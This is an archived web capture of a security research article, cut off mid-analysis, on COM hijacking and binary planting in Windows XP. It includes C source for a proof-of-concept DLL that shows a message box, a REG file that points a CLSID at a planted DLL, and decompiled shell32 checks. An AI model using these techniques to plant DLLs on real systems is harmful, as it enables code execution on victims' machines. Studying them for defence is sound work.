<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html lang="en"><head><script type="text/javascript" async="" src="COM%20Hijacking,%20or%20DLL%20Hijacking%20come%20back_files/ga.js"></script><script src="COM%20Hijacking,%20or%20DLL%20Hijacking%20come%20back_files/analytics.js" type="text/javascript"></script>
<script type="text/javascript">window.addEventListener('DOMContentLoaded',function(){var v=archive_analytics.values;v.service='wb';v.server_name='wwwb-app202.us.archive.org';v.server_ms=441;archive_analytics.send_pageview({});});</script>
<script type="text/javascript" src="COM%20Hijacking,%20or%20DLL%20Hijacking%20come%20back_files/bundle-playback.js" charset="utf-8"></script>
<script type="text/javascript" src="COM%20Hijacking,%20or%20DLL%20Hijacking%20come%20back_files/wombat.js" charset="utf-8"></script>
<script>window.RufflePlayer=window.RufflePlayer||{};window.RufflePlayer.config={"autoplay":"on","unmuteOverlay":"hidden"};</script>
<script type="text/javascript" src="COM%20Hijacking,%20or%20DLL%20Hijacking%20come%20back_files/ruffle.js"></script>
<script type="text/javascript">
    __wm.pc(0.001);
    __wm.init("https://web.archive.org/web");
  __wm.wombat("http://www.nobunkum.ru:80/analytics/en-com-hijacking","20180315065432","https://web.archive.org/","web","https://web-static.archive.org/_static/",
	      "1521096872");
</script>
<link rel="stylesheet" type="text/css" href="COM%20Hijacking,%20or%20DLL%20Hijacking%20come%20back_files/banner-styles.css">
<link rel="stylesheet" type="text/css" href="COM%20Hijacking,%20or%20DLL%20Hijacking%20come%20back_files/iconochive.css">
<!-- End Wayback Rewrite JS Include -->

  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>COM Hijacking, or DLL Hijacking come back</title>
  <!-- base href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/" -->
  <link rel="alternate" type="application/rss+xml" title="Журнал NO BUNKUM — Новости" href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/rss">
  <link rel="stylesheet" type="text/css" href="COM%20Hijacking,%20or%20DLL%20Hijacking%20come%20back_files/style.css">
<!--[if lt IE 8]>
<link rel="stylesheet" type="text/css" href="/template/css/ie.css" />
<![endif]-->
<!--[if IE 6]>
<link rel="stylesheet" type="text/css" href="/template/css/ie6.css" />
<![endif]-->
</head>
<body><!-- BEGIN WAYBACK TOOLBAR INSERT -->
<script>__wm.rw(0);</script>
<div id="wm-ipp-base" lang="en" style="display: block; direction: ltr;">
</div><div id="wm-ipp-print">The Wayback Machine - https://web.archive.org/web/20180315065432/http://www.nobunkum.ru:80/analytics/en-com-hijacking</div>
<script type="text/javascript">//<![CDATA[
__wm.bt(725,27,25,2,"web","http://www.nobunkum.ru/analytics/en-com-hijacking","20180315065432",1996,"https://web-static.archive.org/_static/",["https://web-static.archive.org/_static/css/banner-styles.css?v=S1zqJCYt","https://web-static.archive.org/_static/css/iconochive.css?v=qtvMKcIJ"], false);
  __wm.rw(1);
//]]></script>
<!-- END WAYBACK TOOLBAR INSERT -->
 
      <div class="subscribe">
        
<form action="/web/20180315065432/http://nobunkum.ru/analytics/en-com-hijacking" method="post">
<div>
<input class="mail" type="text" name="email" placeholder="newsletter">
<input type="hidden" name="groups[]" value="1">
<input class="submit" type="submit" value="OK"></div>
</form>
      </div>
  <div id="header">
    <div id="title">
      <a id="logo" href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/"><img src="COM%20Hijacking,%20or%20DLL%20Hijacking%20come%20back_files/logo.jpg" width="374" height="51" alt="NO BUNKUM"></a>
      <p>...on guns, germs, and steel of the digital age</p>
    </div>
    <div id="subtitle">
      <ul><li class="first"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/lookout/" title="Lookout" class="issue">Lookout</a></li>
<li class="current"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/analytics/" title="Analytics" class="issue">Analytics</a></li>
<li><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/ru/" title="NO BUNKUM" class="issue">NO BUNKUM</a></li>
<li class="last"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/demo/" title="Demo" class="issue">Demo</a></li>
</ul>
      <div class="headerlinks">
        <a id="headerlink-about" href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/about" title="О журнале"><span>?</span></a>
        <a id="headerlink-rss" href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/rss" title="RSS"><span>RSS</span></a>
      </div>
    </div>
  </div>
  <div id="content">
    <div class="aside-long" style="text-align:center;padding:15px 10px">
      <span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=Exploit.SWF.Agent.br">Exploit.SWF.Agent.br</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=Pdfka.asd">Pdfka.asd</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=Pidief.cvl">Pidief.cvl</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight2"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=TDSS">TDSS</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=TDSS+removal">TDSS removal</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=binary+planting">binary planting</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=bios+infection">bios infection</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=blind+sqli">blind sqli</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=bootkit">bootkit</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=bootkit+remover">bootkit remover</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=browser+exploitation">browser exploitation</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=com+hijacking">com hijacking</a></span>
<span class="tl-tag tl-tag-weight4"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=disassembling">disassembling</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=dll+hijacking">dll hijacking</a></span>
<span class="tl-tag tl-tag-weight2"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=drive-by+downloads">drive-by downloads</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=hack+online+banks">hack online banks</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=heap-spray">heap-spray</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=hijack+botnet">hijack botnet</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=ibank">ibank</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=kernel+protection">kernel protection</a></span>
<span class="tl-tag tl-tag-weight1"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=kernel-mode+rootkit">kernel-mode rootkit</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=keylogger">keylogger</a></span>
<span class="tl-tag tl-tag-weight5"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=malware+analysis">malware analysis</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight2"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=rootkit+detection">rootkit detection</a></span>
<span class="tl-tag tl-tag-weight3"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=trojan">trojan</a></span>
<span class="tl-tag tl-tag-alt tl-tag-weight1"><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/tags?tag=virus+removal">virus removal</a></span>
    </div>
    <div style="margin-top: -10px;">
<h1>COM Hijacking, or DLL Hijacking come back</h1>
<p class="author">Kirill Soldatov<br><a href="https://web.archive.org/web/20180315065432/mailto:lyr1k.2008@gmail.com">lyr1k.2008@gmail.com</a></p>
<ul class="toc">
<li><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/analytics/en-com-hijacking#link1">Introduction</a></li>
<li><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/analytics/en-com-hijacking#otherlink2">The essence of the COM-Server Based Binary Planting attack</a></li>
<li><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/analytics/en-com-hijacking#otherlink3">Sample attack</a></li>
<li><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/analytics/en-com-hijacking#otherlink4">Conditions of a successful attack</a></li>
<li><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/analytics/en-com-hijacking#otherlink5">Analysis of the program verclsid.exe and ways to circumvent it</a></li>
<li><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/analytics/en-com-hijacking#otherlink6">Conclusion</a></li>
<li><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/analytics/en-com-hijacking#otherlink7">Literature</a></li>
<li><a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/analytics/en-com-hijacking#otherlink8">Attachment</a></li>
</ul>
<h2 id="link1">Introduction</h2>
<p>Many have heard about the infamous DLL Hijacking attacks, but one 
subcategory of such attacks is far from being well-known: COM Hijacking,
 or COM-Server Based Binary Planting[1]. What do these attacks have in 
common with the DLL Hijacking? In order to answer that question, let's 
examine the OLE\COM mechanism used in Windows.</p>
<div class="aside">
<h4>The article is also available in <a href="https://web.archive.org/web/20180315065432/http://nobunkum.ru/ru/com-hijacking">Russian</a></h4>
<p><a href="https://web.archive.org/web/20180315065432/http://www.binaryplanting.com/">1. Binary Planting - The Official Web Site</a></p>
</div>
<p>Итак, <strong>COM</strong>, or <strong>Component Object Model</strong>
 is a Microsoft-developed standard which supports interaction between 
processors and dynamic object creation independent of the programming 
language. In other words, it's a way to exchange binary code between 
different applications and languages. This means that, when the COM 
standard is used, a component can be written in any language. At this 
moment, the Windows world is home to a great number of technologies, but
 practically all of them are built more or less on the COM: OLE, 
ActiveX, COM+, DCOM.</p>
<p>Let's begin with the definitions used in the COM realm. <strong><em>Interface</em></strong> is simply a group of functions. These functions are called <strong><em>'methods'</em></strong>. Usually, names of interfaces start with an 'I', for example, <strong>IShellFolder</strong>.
 Interfaces can inherit from other interfaces. However, inheritance here
 works in the same way as the single inheritance in C++, i. e. the COM 
standard does not have multiple inheritance. <strong><em>Component object class</em></strong> (<strong><em>coclass</em></strong>)
 is contained in a DLL or EXE file and itself contains the code of one 
or more interfaces. A coclass implements the interfaces it contains. <strong><em>COM object</em></strong> is an instance of a coclass in memory. <strong><em>COM server</em></strong> is a binary file (either COM or EXE) which contains one or more coclasses. <strong><em>COM library</em></strong> is a part of the operating system responsible for interacting with an application. <strong><em>GUID</em></strong> (<strong><em>globally unique identifier</em></strong>) is a 128-bit number used for unique identification of an object within the COM realm:</p>
<ul>
<li><strong><em>CLSID</em></strong>, class ID is the coclass identifier;</li>
<li><strong><em>IID</em></strong>, interface ID is the interface identifier.</li>
</ul>
<p>We are basically done with the introduction to the COM realm. If you 
feel confused by these definitions, don't worry: things should become 
clearer when we get to the practice.</p>
<h2 id="otherlink2">The essence of the COM-Server Based Binary Planting attack</h2>
<p><em>All screenshots in this article are made under the Windows XP SP3 Rus x86 virtual machine (with all updates as of 12/14/2011).</em></p>
<p>It is well-known that Windows has so-called virtual folders, such as 
Control Panel, My Computer, etc. Each of these folders has its own CLSID
 in the Windows Registry. For instance, My Computer's CLSID is 
{20D04FE0-3AEA-1069-A2D8-08002B30309D}, and Control Panel's CLSID is 
{21EC2020-3AEA-1069-A2DD-08002B30309D}. It is easy to open a virtual 
folder with the Win+R hotkey combination (same as clicking Start -&gt; 
Run) knowing its CLSID. You just need to add '::' in front of the CLSID:</p>
<div class="figure"><img src="COM%20Hijacking,%20or%20DLL%20Hijacking%20come%20back_files/image1.png" alt=""></div>
<p>But if you try to open the Control Panel this way, it won't work, 
since the Control Panel is a subfolder of My Computer. In order to open 
the Control Panel, you need to specify the full path to it: 
'::{20D04FE0-3AEA-1069-A2D8-08002B30309D}\::{21EC2020-3AEA-1069-
A2DD-08002B30309D}'. Now, what if we create a new virtual folder named 
Test.{20D04FE0-3AEA-1069-A2D8-08002B30309D}? We will get a folder Test 
which, when viewed in explorer.exe, will display the same icon as My 
Computer (full path to the folder: С:\Documents and 
Settings\Administrator\Desktop\SomeFolder\Test.{20D04FE0-3AEA-1069-
A2D8-08002B30309D}\):</p>
<div class="figure"><img src="COM%20Hijacking,%20or%20DLL%20Hijacking%20come%20back_files/image2.png" alt=""></div>
<p>Moreover, if we try to open this folder, we will actually get into My
 Computer. Note that the extension of the folder we have just created 
(the part of its name after the last dot) is not shown in explorer.exe. 
Let's find out which DLL is used for the My Computer virtual folder. To 
learn that, we need to look at the default value of the Registry key 
'HKLM\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\InProcServer32':</p>
<div class="figure"><img src="COM%20Hijacking,%20or%20DLL%20Hijacking%20come%20back_files/image3.png" alt=""></div>
<p>Thus, the library shell32.dll is used for the folder My Computer. 
Therefore we can assume that when we open this folder, shell32.dll gets 
loaded (in reality, no loading takes place since this library is always 
loaded). To test that, let's create a DLL file (the archive with the 
source and the binary is included with this article):</p>
<pre><code>#define WIN32_LEAN_AND_MEAN
#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;tchar.h&gt;

#pragma comment(lib, “user32.lib”)

BOOL WINAPI
DllMain( 
    IN HMODULE hModule, 
    IN DWORD   dwReason, 
    IN LPVOID  lpReserved
) 
{     
    switch (dwReason) 
    { 
    case DLL_PROCESS_ATTACH: 
        { 
            TCHAR szModulePath[MAX_PATH], szProcessModulePath[MAX_PATH]; 
            TCHAR szMessage[MAX_PATH]; 
            ZeroMemory(szModulePath, sizeof(szModulePath)); 
            ZeroMemory(szProcessModulePath,  
                sizeof(szProcessModulePath)); 

            GetModuleFileName(hModule, szModulePath, MAX_PATH – 1); 
            GetModuleFileName(GetModuleHandle(NULL),  
                szProcessModulePath, MAX_PATH – 1); 

            _stprintf_s( 
                szMessage,  
                _T(“DLL library \”%s\” injected into the process \”%s\” (PID=%d)”), 
                szModulePath, szProcessModulePath, GetCurrentProcessId() 
                ); 

            MessageBox(0, szMessage, _T(“HACKED!”), MB_ICONERROR);
            break; 
        }

    case DLL_THREAD_ATTACH: 
    case DLL_THREAD_DETACH: 
    case DLL_PROCESS_DETACH: 
        break; 
    } 

    return (FALSE); 
}</code></pre>
<p>Let's compile this library into FakeSHELL32.dll (cl.exe 
FakeSHELL32.cpp /MT /D “UNICODE” /D “_UNICODE” /LD), , place it in the 
folder C:\1\ and change the Registry path:</p>
<div class="figure"><img src="COM%20Hijacking,%20or%20DLL%20Hijacking%20come%20back_files/image4.png" alt=""></div>
<p>Now if we open the Test.{20D04FE0-3AEA-1069-A2D8-08002B30309D} folder, we will see the following:</p>
<div class="figure"><img src="COM%20Hijacking,%20or%20DLL%20Hijacking%20come%20back_files/image5.png" alt=""></div>
<p>So the system indeed loads the COM server identified with CLSID 
{20D04FE0-3AEA-1069-A2D8-08002B30309D} (we will see in a moment why the 
DLL got inserted in the verclsid.exe).</p>
<h2 id="otherlink3">Sample attack</h2>
<p>For the sake of example, let's take a publicly available PoC[2]. They
 say on the website that the vulnerability cannot be exploited if you 
have the MS11-071 update[3]. Since we have this update installed in our 
system, we need to create a CLSID manually and enter the required 
minimum of data. To achieve this, let's create and run the following REG
 file (also included in the enclosed archive):</p>
<div class="aside">
<p><a href="https://web.archive.org/web/20180315065432/http://www.binaryplanting.com/demo/XP_2-click/XP_2-click.zip">2. PoC</a></p>
<p><a href="https://web.archive.org/web/20180315065432/http://technet.microsoft.com/en-us/security/bulletin/ms11-071">3. MS11-071 update</a></p>
</div>
<pre><code>[HKEY_CLASSES_ROOT\CLSID\{42071714-76d4-11d1-8b24-00a0c9068ff3}]

[HKEY_CLASSES_ROOT\CLSID\{42071714-76d4-11d1-8b24-00a0c9068ff3}\InProcServer32]
@="deskpan.dll"
"ThreadingModel"="Apartment"</code></pre>
<p>After making all the required changes, let's create a folder 
Files.{42071714-76d4-11d1-8b24-00a0c9068ff3} (I created it right on the 
Desktop). Let's rename our DLL file into deskpan.dll and move it to this
 folder. Le's also create in it an empty RTF document (following the 
advice from «The Anatomy of COM Server-Based Binary Planting 
Exploits»[4]). If we try to open this file... nothing will happen. To 
find out why, let's open the ProcessMonitor and set the filters as 
needed. We can see that when we try to open the RTF file, the system 
does search for the DLL, but only within the verclsid.exe process 
(C:\Windows\system32\verclsid.exe):</p>
<div class="aside">
<p><a href="https://web.archive.org/web/20180315065432/http://blog.acrossecurity.com/2011/05/anatomy-of-com-server-based-binary.html">4. The Anatomy of COM Server-Based Binary Planting Exploits</a></p>
</div>
<div class="figure"><img src="COM%20Hijacking,%20or%20DLL%20Hijacking%20come%20back_files/image6.png" alt=""></div>
<p>Let's rename this file to verclsid.exe and try to open the RTF again.
 Hooray! Now the vulnerability works exactly as described at «The 
Anatomy of COM Server-Based Binary Planting Exploits».</p>
<div class="figure"><img src="COM%20Hijacking,%20or%20DLL%20Hijacking%20come%20back_files/image7.png" alt=""></div>
<div class="figure"><img src="COM%20Hijacking,%20or%20DLL%20Hijacking%20come%20back_files/image8.png" alt="" width="767" height="537"></div>
<p>So what is happening in the depths of the OS? Why the DLL would not 
load if the verclsid.exe is present? Let's try and sort it out.</p>
<h2 id="otherlink4">Conditions of a successful attack</h2>
<p>First, let's see which functions are called when the system doesn't 
have the verclsid.exe. Let's run it in the debugger and place a 
breakpoint at DllMain. Now the call stack of my testing machine looks 
like the following:</p>
<pre><code>kd&gt; k 40 ChildEBP RetAddr 
0006c4fc 10001027 ntdll!DbgBreakPoint
0006cb24 10001456 deskpan!DllMain+0x27 
0006cb64 100014fe deskpan!__DllMainCRTStartup+0x6c [f:\dd\vctools\crt_bld\self_x86\crt\src\dllcrt0.c @ 330] 
0006cb70 7c90118a deskpan!_DllMainCRTStartup+0x1e [f:\dd\vctools\crt_bld\self_x86\crt\src\dllcrt0.c @ 293] 
0006cb90 7c91b5d2 ntdll!LdrpCallInitRoutine+0x14 
0006cc98 7c9162db ntdll!LdrpRunInitializeRoutines+0x344 
0006cf44 7c91643d ntdll!LdrpLoadDll+0x3e5 
0006d1ec 7c801bbd ntdll!LdrLoadDll+0x230 
0006d254 77511fc5 kernel32!LoadLibraryExW+0x18e 
0006d278 77511ee1 ole32!CClassCache::CDllPathEntry::LoadDll+0x6c 
0006d2a8 77511364 ole32!CClassCache::CDllPathEntry::Create_rl+0x37 
0006d4f4 77511287 ole32!CClassCache::CClassEntry::CreateDllClassEntry_rl+0xd6 
0006d53c 775111e5 ole32!CClassCache::GetClassObjectActivator+0x195 0006d568 
77510d4f ole32!CClassCache::GetClassObject+0x23 0006d5e4 
77510bf3 ole32!CServerContextActivator::CreateInstance+0x106 
0006d624 77510e42 ole32!ActivationPropertiesIn::DelegateCreateInstance+0xf7 
0006d678 77510db9 ole32!CApartmentActivator::CreateInstance+0x110 
0006d698 77511c08 ole32!CProcessActivator::CCICallback+0x6d 
0006d6b8 77511bbf ole32!CProcessActivator::AttemptActivation+0x2c 
0006d6f0 77510ea3 ole32!CProcessActivator::ActivateByContext+0x42 
0006d718 77510bf3 ole32!CProcessActivator::CreateInstance+0x49 0006d758 
77510b8e ole32!ActivationPropertiesIn::DelegateCreateInstance+0xf7 
0006d9a8 77510bf3 ole32!CClientContextActivator::CreateInstance+0x8f 
0006d9e8 77510a38 ole32!ActivationPropertiesIn::DelegateCreateInstance+0xf7 
0006e198 774ff1b3 ole32!ICoCreateInstanceEx+0x3c9 0006e1c0
774ff182 ole32!CComActivator::DoCreateInstance+0x28 0006e1e4 
774ff1f0 ole32!CoCreateInstanceEx+0x1e 0006e214 
77f6947c ole32!CoCreateInstance+0x37 
0006e23c 7c9f1621 SHLWAPI!SHCoCreateInstanceAC+0x3a 
0006e620 7c9f29d8 SHELL32!_SHCoCreateInstance+0x127 
0006e660 7c9f2997 SHELL32!SHExtCoCreateInstance2+0x41 
<strong>0006e680 7ca2faca SHELL32!SHExtCoCreateInstance+0x1e</strong>
<strong>0006e8e0 7c9eda9e SHELL32!CFSFolder::_Bind+0x78</strong> 
0006e908 7c9efb4c SHELL32!CFSFolder::BindToObject+0xa0 
0006e9c4 7c9efb73 SHELL32!CFSFolder::ParseDisplayName+0x1cb 
0006ea98 7c9efb73 SHELL32!CFSFolder::ParseDisplayName+0x1ee 
0006eb88 7c9efb73 SHELL32!CFSFolder::ParseDisplayName+0x1ee 
0006eca8 7c9ee24b SHELL32!CFSFolder::ParseDisplayName+0x1ee 
0006ed18 7c9ee143 SHELL32!CDrivesFolder::ParseDisplayName+0xe8 
0006ed80 7c9ee36e SHELL32!CRegFolder::ParseDisplayName+0x93 
0006eda8 7c9ee30c SHELL32!CDesktopFolder::_ChildParseDisplayName+0x22 
0006edf8 7c9ee143 SHELL32!CDesktopFolder::ParseDisplayName+0x7e 
0006ee60 7c9ee090 SHELL32!CRegFolder::ParseDisplayName+0x93 
0006ee98 7c9ee629 SHELL32!SHParseDisplayName+0xa3 
0006eebc 7c9ee5e3 SHELL32!ILCreateFromPathEx+0x3d 
0006eed8 7c9ee787 SHELL32!SHILCreateFromPath+0x17
0006eef0 7ca34cba SHELL32!ILCreateFromPathW+0x18
0006f370 728442c7 SHELL32!SHGetFileInfoW+0x117
0006f654 728441ad MFC42u!AfxResolveShortcut+0x41 
0006fc9c 728beabe MFC42u!CDocManager::OpenDocumentFile+0x8c 
0006fcc4 01013fc0 MFC42u!CWinApp::ProcessShellCommand+0x10c 
0006ff0c 72841317 WORDPAD!CWordPadApp::InitInstance+0x244 
0006ff1c 0101aa5d MFC42u!AfxWinMain+0x47 
0006ffc0 7c817077 WORDPAD!wWinMainCRTStartup+0x198 
0006fff0 00000000 kernel32!BaseProcessStart+0x23</code></pre>
<p>You can see that after the <strong>SHELL32!SHExtCoCreateInstance</strong> function is called, the DLL always gets loaded. So the trigger function is the function <strong>SHELL32!CFSFolder::_Bind</strong>:</p>
<pre><code>HRESULT __stdcall
CFSFolder___Bind(
IN  const _ITEMIDLIST *pidl, 
IN  IBindCtx *pBindCtx, 
IN  const _GUID *pGUID, 
OUT void **ppv
)
{
  …
  lastItemId = (SHITEMID *)ILFindLastID((LPCITEMIDLIST)pBindCtx);
  if ( CFSFolder___GetBindCLSID(pbc, pidl, lastItemId) )
  {
    hr = SHExtCoCreateInstance(0, (const CLSID *)&amp;guid;, 0, riid, ppv);
    if ( SUCCEEDED(hr) )
    {
        …
    }
    …
  }
  …
}</code></pre>
<p>As you can see from the code, the <strong>SHELL32!SHExtCoCreateInstance</strong> function gets called only if the <strong>SHELL32!CFSFolder___GetBindCLSID</strong> function has been called successfully and with the resulting value of the <strong>SHELL32!ILFindLastID</strong>
 function passed to it. The SHELL32!ILFindLastID function, in turn, gets
 the last part of the path to the object (the path to any object in 
SHELL is specified with the ITEMIDLIST structure; there is more on that 
at «The Complete Idiot's Guide to Writing Namespace Extensions - Part 
I»[5]) whereas the SHELL32!CFSFolder___GetBindCLSID checks whether this 
last part is a CLSID. If this is indeed so, then for the respective 
CLSID the <strong>SHELL32!SHExtCoCreateInstance</strong> function is called. Let's look at the code of this function:</p>
<div class="aside">
<p><a href="https://web.archive.org/web/20180315065432/http://www.codeproject.com/KB/shell/namespcextguide1.aspx?display=Print">5. The Complete Idiot's Guide to Writing Namespace Extensions - Part I</a></p>
</div>
<pre><code>HRESULT __stdcall 
SHExtCoCreateInstance(
IN  LPCWSTR pszCLSID,
IN  const CLSID *pclsid, 
IN  IUnknown *punkOuter,
IN  const IID *const riid,
OUT void **ppv
)
{
  return SHExtCoCreateInstance2(pszCLSID, pclsid, punkOuter, CLSCTX_INPROC_SERVER|CLSCTX_NO_CODE_DOWNLOAD, riid, ppv);
}</code></pre>
<p>So the <strong>SHELL32!SHExtCoCreateInstance</strong> function is a wrap around the <strong>SHELL32!SHExtCoCreateInstance2</strong> function:</p>
<pre><code>HRESULT __stdcall
SHExtCoCreateInstance2(
IN  LPCWSTR pszCLSID,
IN  const CLSID *pclsid,
IN  IUnknown *punkOuter,
IN  DWORD dwClsContext,
IN  const IID *const riid,
OUT void **ppv
)
{
  const CLSID *clsid;
  CLSID pClsid;

  clsid = pclsid;
  if ( pszCLSID )
  {
    SHCLSIDFromString(pszCLSID, &amp;pClsid;);
    clsid = &amp;pClsid;
  }
  return _SHCoCreateInstance(clsid, punkOuter, dwClsContext, TRUE, riid, ppv);
}</code></pre>
<p>In turn, the <strong>SHELL32!SHExtCoCreateInstance2</strong> function is a wrap around the function <strong>SHELL32!_SHCoCreateInstance</strong>
 and, if needed, turns the CLSID line into the CLSID. In our case this 
is not happening, since the first parameter of the called <strong>SHELL32!SHExtCoCreateInstance2</strong> function is NULL. Here is the key fragment of <strong>SHELL32!_SHCoCreateInstance</strong>:</p>
<pre><code>HRESULT __stdcall
_SHCoCreateInstance( 
IN const CLSID *pclsid, 
IN IUnknown *pUnkOuter, 
IN DWORD dwCoCreateFlags, 
IN BOOL bMustBeApproved, 
IN const IID *const riid, 
OUT void **ppv ) 
{
  HRESULT hRetCode;
  priid = riid;
  …
  if ( bMustBeApproved 
	&amp;&amp; SHStringFromGUIDW(pclsid, &amp;pszClsidValue, 103) 
	&amp;&amp; SHStringFromGUIDW(priid, &amp;pszIidValue, 103) 
	&amp;&amp; !_ShouldLoadShellExt(&amp;pszClsidValue, &amp;pszIidValue, dwCoCreateFlags, pvData) )
	{
		hr = E_ACCESSDENIED; 
	} 
  else
	{
		hRetCode = SHCoCreateInstanceAC(pclsid, pUnkOuter, dwCoCreateFlags, priid, ppv); 
		hr = hRetCode; 
		if ( FAILED(hRetCode) ) 
		{ 
			if ( v10 ) 
			{ 
				if ( v9 ) 
				{ 
					if (hRetCode == REGDB_E_IIDNOTREG || hRetCode == CO_E_FIRST )
						hr = _CreateFromDll(&amp;pvData, pclsid, pUnkOuter, priid, ppv); 
				} 
			}
		}
	…
	}
}</code></pre>
<p>So the execution logic of this function is simple enough: after turning the CLSID and the IID into string values it calls the <strong>SHELL32!_ShouldLoadShellExt</strong>. In the event it returns a <strong><span style="text-decoration: underline;">non-null</span></strong> value, the <strong>SHLWAPI!SHCoCreateInstanceAC</strong>
 function gets called and actually loads the desired DLL (which happens 
in our case: see the call stack). Let's take a look at the function <strong>SHELL32!_ShouldLoadShellExt</strong>:</p>
<pre><code>HRESULT __stdcall 
_ShouldLoadShellExt(
IN  LPCWSTR pszCLSID,
IN  LPCWSTR pszIID,
IN  DWORD dwClsContext,
IN  LPCWSTR lpDllName
)
{
  HRESULT result;

  if ( _FindPolicyEntry(
         &amp;g;_hklmBlockedExt,
         &amp;g;_hkcuBlockedExt,
         L"Software\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions\\Blocked",
         pszCLSID)
    || SHRestricted(REST_ENFORCESHELLEXTSECURITY)
    &amp;&amp; !_FindPolicyEntry(
          &amp;g;_hklmApprovedExt,
          &amp;g;_hkcuApprovedExt,
          L"Software\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions\\Approved",
          pszCLSID) )
    result = S_OK;
  else
    result = _QueryClassInterface(pszCLSID, pszIID, dwClsContext);
  return result;
}</code></pre>
<p>First, this function checks whether or not the CLSID is disallowed. In order to accomplish this, it reads the Registry branches <strong>HKLM\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Blocked</strong> and <strong>HKCU\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Blocked</strong>,
 looking for the parameter value equal to the CLSID (pszCLSID). If such a
 parameter is found (its type doesn't matter), the function returns a 
non-null value. Then it checks the policy <strong>REST_ENFORCESHELLEXTSECURITY</strong>
 which, being turned on, allows to run only the trusted extensions of 
SHELL, i. e. those extensions whose names are also the parameters of the
 Registry keys <strong>HKLM\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved</strong> and <strong>HKCU\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved</strong>. Since the policy <strong>REST_ENFORCESHELLEXTSECURITY</strong> is turned off on the testing machine, and the Registry keys <strong>HKLM\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Blocked</strong> and <strong>HKCU\Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Blocked</strong> are empty, the function <strong>SHELL32!_QueryClassInterface</strong>
 gets called and returns a non-null value. This function is pretty long 
and performs a number of checks before returning the control. For the 
sake of simplicity, let's separate the function flow into items and 
describe each of them in detail. The function's prototype looks like 
this:</p>
<pre><code>HRESULT __stdcall _QueryClassInterface( IN LPCWSTR pszCLSID, IN LPCWSTR pszIID, IN DWORD dwClsContext )</code></pre>
<ol>
<li>Conversion of the passed values of pszCLSID, pszIID and dwClsContextinto string with the %s %s 0x%X pattern.</li>
